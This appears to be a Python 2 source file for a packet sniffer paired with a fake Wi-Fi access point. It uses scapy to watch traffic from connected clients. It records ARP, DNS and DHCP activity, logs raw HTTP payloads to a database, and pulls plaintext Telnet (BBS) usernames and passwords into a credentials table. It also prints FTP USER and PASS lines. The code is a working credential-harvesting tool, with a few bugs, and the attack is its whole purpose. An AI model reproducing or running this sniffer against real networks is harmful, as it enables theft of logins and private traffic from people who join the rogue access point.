#!/usr/bin/env python2
#! Copyright (C) 2015-2015 Hack Stuff. All right reserved.
#
# Author : 2015/05 cmj<cmj@cmj.tw>

from src.flask_backend import *
from multiprocessing import Process
from multiprocessing import Queue as QUEUE	## Since scapy using Queue.py

from tables import MariaDB, HTTP_RAW

class Steven5538(object):
	""" Steven5538 - The package filter used in SHIT """

	FMT = "{0:<10} - {1.src:16} => {1.dst:16} - {2:.32}"
	def __init__(self, args):
		self.conf  = args.config
		self.iface = args.iface if args.iface else self.APWiFi['NAME']
		self.args  = args
		self.db    = MariaDB("backend/shit.db")
	def __call__(self):
		""" Run all sniffer backend """
		import select, os

		print "Start SF ({0}) ...".format(os.getpid())
		while True:
			try:
				sniff(iface=self.iface, filter=self.filter, prn=self.handler, store=0)
			except select.error as e:
				continue

	def PKG_01ARP(self, pkg):
		""" Sniffer the ARP query """

		if 'stopARP' in self.conf and self.conf['stopARP']:
			return False
		elif 'Ethernet' != pkg.name or 'ARP' != pkg.payload.name:
			return False

		FMT = "{0:<10} - {1.psrc:16} ({1.hwsrc}) => {1.pdst:16} ({1.hwdst})"
		ret = FMT.format("ARP", pkg.payload)
		self.queue = 'arp', ret
		return True
	def PKG_02DNS(self, pkg):
		""" Sniffer the DNS query """

		if 'stopDNS' in self.conf and self.conf['stopDNS']:
			return False
		elif 'Ethernet' != pkg.name or 'IP' != pkg.payload.name:
			return False
		udp = pkg.payload.payload
		if 'UDP' != udp.name or 53 != udp.dport:
			return False

		dns = pkg.payload
		ret = self.FMT.format("DNS", pkg.payload, dns.qd.qname)
		print ret
		self.queue = 'dns', ret
		return True
	def PKG_03Telnet(self, pkg):
		""" Sniffer the BBS (Telnet) query """
		from string import printable


		if 'stopTelnet' in self.conf and self.conf['stopTelnet']:
			return False
		elif 'Ethernet' != pkg.name or 'IP' != pkg.payload.name:
			return False
		tcp = pkg.payload.payload
		if 'TCP' != tcp.name or 23 != tcp.dport:
			return False

		## Create the telnet stack for each src
		if not hasattr(self, '_telnet_'):
			self._telnet_ = {}


		## HACK - Only record when first connection - SYN
		src = pkg.payload.src
		if 2 & tcp.flags:
			self._telnet_[src] = ''

		## FIXME - Should fix when first login will get extra 'vt100P'
		if tcp.payload and tcp.payload.load and src in self._telnet_:
			self._telnet_[src] += ''.join([_ for _ in tcp.payload.load if _ in printable])

			if 2 <= self._telnet_[src].count('\r'):
				ret = self._telnet_[src].split('\r')
				ret[0] = ret[0][6:]	## Since Nally always append vt100P at the first 6 char
				url = 'bbs://{0}'.format(pkg.payload.dst)
				self.storeDB = {'username': ret[0], 'password': ret[1], 'url': url}

				ret = self.FMT.format("BBS", pkg.payload, self._telnet_[src])
				ret = ret.split('\r')
				print "{0} / {1:.3}XXXXX".format(*ret)
				self.queue = 'telnet', ret
				del self._telnet_[src]
		return True
	def PKG_04HTTP(self, pkg):
		""" Sniffer the BBS (Telnet) query """
		import re

		if 'stopHTTP' in self.conf and self.conf['stopHTTP']:
			return False
		elif 'Ethernet' != pkg.name or 'IP' != pkg.payload.name:
			return False
		tcp = pkg.payload.payload
		if 'TCP' != tcp.name or 80 not in (tcp.sport, tcp.dport):
			return False
		elif not tcp.payload:
			return False

		payload = tcp.payload.load.encode('utf-8', 'ignore')
		node = HTTP_RAW(src='{0}'.format(pkg.payload.src), dst='{0}'.format(pkg.payload.dst), payload='{0}'.format(payload))
		self.db.add(node)
		self.db.commit()

		return True
	def PKG_05DHCP(self, pkg):
		""" Sinffer the DHCP query """
		if 'stopDHCP' in self.conf and self.conf['stopDHCP']:
			return False
		elif 'Ethernet' != pkg.name or 'IP' != pkg.payload.name:
			return False
		udp = pkg.payload.payload
		if 'UDP' != udp.name or udp.dport not in (67, 68):
			return False
		elif not udp.payload:
			return False

		ret = self.FMT.format("DHCP", pkg.payload, '')
		print ret
		self.queue = 'dhcp', ret
		return True
	def PKG_06FTP(self, pkg):
		"""" Sniffer the FTP query """
		if 'stopFTP' in self.conf and self.conf['stopFTP']:
			return False
		elif 'Ethernet' != pkg.name or 'IP' != pkg.payload.name:
			return False

		tcp = pkg.payload.payload
		if 'TCP' != tcp.name or 21 != tcp.dport:
			return False
		elif not tcp.payload:
			return False
		
		## Create the ftp stack for each src
		if not hasattr(self, '_ftp_'):
			self._ftp_ = {}

		## HACK - Only record when first connection - SYN
		src = pkg.payload.src
		if 2 & tcp.flags:
			self._ftp_[src] = ''

		## FIXME - Should fix when first login will get extra 'vt100P'
		if  str(tcp.payload).startswith('USER'):
			ret = self.FMT.format("FTP", pkg.payload, tcp.payload)
			print ret
		if  str(tcp.payload).startswith('PASS'):
			ret = self.FMT.format("FTP", pkg.payload, tcp.payload)
			print ret
		if tcp.payload and tcp.payload.load and src in self._ftp_:
			self._ftp_[src] += ''.join([_ for _ in tcp.payload.load if _ in printable])
			print self._ftp_[src]
			'''
			if 2 <= self._ftp_[src].count('\r\n'):
				ret = self.FMT.format("FTP", pkg.payload, self._ftp_[src])
				print "{0} / {1:.3}XXXXX".format(*ret.split('\r'))
				self.queue = 'ftp', ret
				del self._ftp_[src]
			'''
		return True

	def PKG_99dump(self, pkg):
		""" Default package handler, always run at-last """
		if 'stopDebug' not in self.conf or not self.conf['stopDebug']:
			print pkg.summary()
		return True

	@property
	def handler(self, prefix="PKG_"):
		"""
		Package handler, SHOULD return function

		NOTE - Only process the function startswith 'prefix' and exit when
		       function return True. The order is using alphanumeric sort.
		"""
		def _hander_(pkg):
			for _ in sorted(dir(self)):
				if 'stopSniff' in self.conf and self.conf['stopSniff']:
					break
				elif _.startswith(prefix) and getattr(self, _)(pkg):
					break
		return _hander_
	@property
	def filter(self):
		""" The sniffer filter, default is empty string """
		return ""
	@property
	def conf(self):
		return self._conf_
	@conf.setter
	def conf(self, v):
		import re

		with open(v) as fd:
			conf = [_ for _ in fd.read().split('\n') if _]

		conf = [_.strip() for _ in conf if not _.startswith('#')]
		conf = {_.split('=')[0]: '='.join(_.split('=')[1:]) for _ in conf}

		## Remove the quotes
		for _ in conf:
			if re.match(r'(["\']).*?\1', conf[_]):
				conf[_] = conf[_][1:-1]

		self._conf_ = conf
	@property
	def APWiFi(self, path='/sys/class/net'):
		if hasattr(self, "_APWiFi_"):
			return self._APWiFi_

		for wifi in [_ for _ in os.listdir(path)]:
			with open('{0}/{1}/address'.format(path, wifi)) as fd:
				mac = fd.read()
				if mac.startswith(self.conf['MACPREFIX']):
					self._APWiFi_ = {"NAME": wifi, "MAC": mac.strip()}
					return self._APWiFi_
		else:
			return None
	@property
	def queue(self):
		if self.args.flask:
			if not hasattr(self, '_queue_') :
				self._queue_ = QUEUE()
			return self._queue_
	@queue.setter
	def queue(self, v):
		if self.args.flask:
			self._queue_.put(v)

	@property
	def storeDB(self):
		raise NotImplementedError
	@storeDB.setter
	def storeDB(self, v):
		if not hasattr(self, '_db_'):
			self._db_ = sessionmaker(bind=engine)()

		record = {'username': '', 'password': ''}
		record.update(v)
		record = SHIT_DB(**record)
		self._db_.add(record)
		self._db_.commit()

if __name__ == '__main__':
	import argparse, os, sys
	import signal

	if os.getuid() and os.geteuid():
		exit("You need to be root!")

	parser = argparse.ArgumentParser(description="Steven Tool")
	_a = parser.add_argument
	_a("-a", "--addr", default="0.0.0.0",
		help="Bind host address for SS")
	_a("-c", "--config", default="fakeAP.conf",
		help="Configure")
	_a("-d", "--debug", action="store_true", default=False,
		help="Enable debug message")
	_a("-f", "--flask", action="store_true", default=False,
		help="Run Flask server")
	_a("-i", "--iface",
		help="Interface you want to sinffer.")
	_a("-p", "--port", default=5538,
		help="Bind the port number for SS")
	_a("-r", "--reload", action="store_true", default=False,
		help="Reload SF")

	args = parser.parse_args()

	import logging
	# disable scapy ipv6 warning
	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
	from scapy.all import *

	PIDFILE = '/tmp/StevenFilter.pid'
	try:
		with open(PIDFILE) as fd:
			pid = fd.read()
		if not args.reload:
			os.kill(int(pid), 9)
	except Exception as e:
		pass

	if args.reload:
		os.kill(int(pid), signal.SIGHUP)
		exit()

	try:
		with open(PIDFILE, 'w') as fd:
			fd.write('{0}'.format(os.getpid()))

		## Prepare the SIGHUP handler
		steven5538 = Steven5538(args)
		def reloadSteven5538(signum, frame):
			global steven5538
			print "Reload ..."
			steven5538.conf = args.config
		signal.signal(signal.SIGHUP, reloadSteven5538)

		## Start sniffer and Flask server
		try:
			if args.flask:
				app = Flask(__name__)
				api = Api(app)

				StevenServer.queue = steven5538.queue
				api.add_resource(StevenServer, '/package')
				api.add_resource(StevenCTL,    '/ctl/<src>')
				param = {'debug': args.debug, 'host': args.addr, 'port': args.port}
				proc = Process(target=app.run, kwargs=param)
				proc.start()

				if not proc.is_alive():
					raise SystemError("SS is not start")

			steven5538()
		except KeyboardInterrupt as e:
			if args.flask:
				proc.terminate()
				proc.join()
			raise
		else:
			if args.flask and proc.is_alive():
				proc.join()
	except Exception as e:
		print e
		raise
	finally:
		os.unlink(PIDFILE)
